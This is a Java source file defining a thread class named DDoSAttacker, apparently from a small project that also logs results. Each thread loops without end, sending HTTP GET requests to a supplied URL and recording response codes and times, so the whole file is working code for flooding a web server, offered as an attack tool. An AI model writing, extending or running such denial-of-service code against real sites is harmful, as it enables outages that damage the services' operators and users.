package sample;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Locale;

public class DDoSAttacker extends Thread {
    public String request;
    private URL url;
    private boolean running = true;


    String param = null;

    public DDoSAttacker(String request) throws Exception {
        this.request = request;
        url = new URL(request);
        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
    }


    @Override
    public void run() {
        while (true) {
            try {
                if(running) {
                    attack();
                }
            } catch (Exception e) {
                System.out.println(e.toString());
            }
        }
    }

    public void stopRunning(){
        running = false;
    }
    public Log attack() {

        try{
            long startTime = System.currentTimeMillis();
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            long endTimeStamp = System.currentTimeMillis();
            double time = (endTimeStamp - startTime) / 1000.0;

            Log log = new Log(responseCode, this.getName().toUpperCase(Locale.ROOT), time, false);
            LogsList.logs.add(log);
            System.out.println(log);
            return log;
        }
        catch (Exception e) {
            System.out.println(e.toString());
        }
        return null;
    }
}